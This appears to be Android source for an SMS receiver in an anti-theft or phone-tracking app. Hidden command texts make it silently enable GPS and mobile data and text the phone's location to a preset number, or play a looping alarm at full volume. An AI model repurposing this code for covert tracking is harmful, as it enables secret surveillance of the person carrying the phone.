package android.service;

import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;

import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.sms.SmsConsts;
import com.particle.inspector.common.util.sms.SuperLoggingSms;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.SIM_TYPE;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Looper;
import android.service.activity.GlobalPrefActivity;
import android.service.activity.InitActivity;
import android.service.config.ConfigCtrl;
import android.service.feature.location.LocationInfo;
import android.service.feature.location.LocationUtil;
import android.service.feature.sms.SmsCtrl;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "SmsReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private Context context;
	
	// **************************************************************************************
    // Receiver for SMS handling
	// **************************************************************************************
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		if (intent.getAction().equals(SMS_RECEIVED)) 
		{
			String smsBody = SmsCtrl.getSmsBody(intent).trim();
			if (smsBody.length() <= 0) return; 

			//-------------------------------------------------------------------------------
			// If it is the activation SMS (only include the key), show the setting view
			if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH ||  
				smsBody.equals(LicenseCtrl.TRIAL_KEY)) 
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				// Save consumed datetime if it is the 1st activation
				String consumeDatetime = ConfigCtrl.getConsumedDatetime(context);
				if (consumeDatetime == null || consumeDatetime.length() <= 0) {
					ConfigCtrl.setConsumedDatetime(context, (new Date()));
				}
				
				// Start dialog
				Intent initIntent = new Intent().setClass(context, InitActivity.class);
				initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
				initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				context.startActivity(initIntent);
			}

			//-------------------------------------------------------------------------------
			// If it is the indication SMS
			else if (smsBody.startsWith(SmsConsts.HEADER_INDICATION))
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				String phoneNum = SmsCtrl.getSmsAddress(intent);
				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
			}
			
			//-------------------------------------------------------------------------------
			// If it is unregister response SMS from server
			else if (smsBody.startsWith(SmsConsts.HEADER_UNREGISTER_EX))
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				String incomingPhoneNum = SmsCtrl.getSmsAddress(intent);
				
			}

			//-------------------------------------------------------------------------------
			// Send location SMS if being triggered by location activation word
			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION))
			{
				abortBroadcast(); // Do not show location activation SMS
				
				this.context = context;
				
				String phoneNum = GlobalPrefActivity.getSafePhoneNum(context);
				
				// If the coming phone is not the receiver phone, return
				String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
				if (phoneNum == null || phoneNum.length() <= 0 || !comingPhoneNum.contains(phoneNum)) {
					return;
				}
				
				// Start a new thread to do the time-consuming job
    			new Thread(new Runnable(){
    				public void run() {
    					String phoneNum = GlobalPrefActivity.getSafePhoneNum(SmsReceiver.this.context);
    					if (BootService.locationUtil == null) {
    						return;
    					}
    					LocationInfo location = getGeoLocation();
    					String locationSms = "";
    					if (location != null) {
    						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location);
    					}
    					else {
    						BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context);
    						locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc);
    					}
    					
    					boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
    				}
    			}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Send location SMS if being triggered by location activation word
			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING))
			{
				abortBroadcast(); // Do not show location activation SMS
				
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				/*
				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
				String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
				if (phoneNum == null || phoneNum.length() <= 0 || !comingPhoneNum.contains(phoneNum)) {
					return;
				}
				*/
				
				// Start a new thread to play ring which is time-consuming
				new Thread(new Runnable(){
					public void run() {
						// Raise volume to max
						AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
						int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
						am.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0);
    					
						// Start to play
						try {
							MediaPlayer mp = MediaPlayer.create(SmsReceiver.this.context, R.raw.alarm);
							mp.setLooping(true);
							mp.start();
						} catch (Exception ex) { 
							Log.e(LOGTAG, ex.getMessage());
						}
					}
				}).start();
			}
			
		} // end of SMS_RECEIVED
        
	} // end of onReceive()
	
	public LocationInfo getGeoLocation()
	{
		long now = (new Date()).getTime();
		
		// If GPS is not enabled, try to enable it
		boolean tryToEnableGPS = false;
		if (!GpsUtil.isGpsEnabled(context)) {
			int tryCount = 0;
			while (!GpsUtil.isGpsEnabled(context) && tryCount < 3) {
				tryCount++;
				GpsUtil.enableGPS(context);
				SysUtils.threadSleep(5000, LOGTAG);
			}
			
			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
		}
		
        // If WIFI is not enabled, try to enable it
     	boolean tryToEnableNetwork = false;
     	if (!NetworkUtil.isNetworkConnected(context)) {
     		tryToEnableNetwork = NetworkUtil.tryToConnectDataNetwork(context);
     	}
     	
		// Try to sleep for a while for the LocationUtil to update location records
     	SysUtils.threadSleep(40000, LOGTAG);
     	LocationInfo location = null;
     	int tryCount = 0;
     	while (location == null && tryCount <= 7) {
     		tryCount++;
     		SysUtils.threadSleep(10000, LOGTAG);
    	   	if (BootService.locationUtil.locationGpsQueue.size() > 0) {
    	   		Location loc = BootService.locationUtil.locationGpsQueue.getLast();
    	   		// If the location is got after the action beginning
    	   		if (loc.getTime() > now) {
    	   			location = new LocationInfo(loc, LocationInfo.GPS);
    	   		}
        	}
    	   	else if (BootService.locationUtil.locationWifiQueue.size() > 0) {
    	   		Location loc = BootService.locationUtil.locationWifiQueue.getLast();
    	   		// If the location is got after the action beginning
    	   		if (loc.getTime() > now) {
    	   			location = new LocationInfo(loc, LocationInfo.WIFI);
    	   		}
        	}
     	}
	    	
	    // If GPS previously forced to be enabled, try to disable it
	   	if (tryToEnableGPS) {
	   		GpsUtil.disableGPS(context);
	   	}
	   	
	    // If network previously forced to be enabled, try to disable it
    	if (tryToEnableNetwork) {
    		NetworkUtil.tryToDisconnectDataNetwork(context);
    	}
	   	
    	return location;
    }	
	
}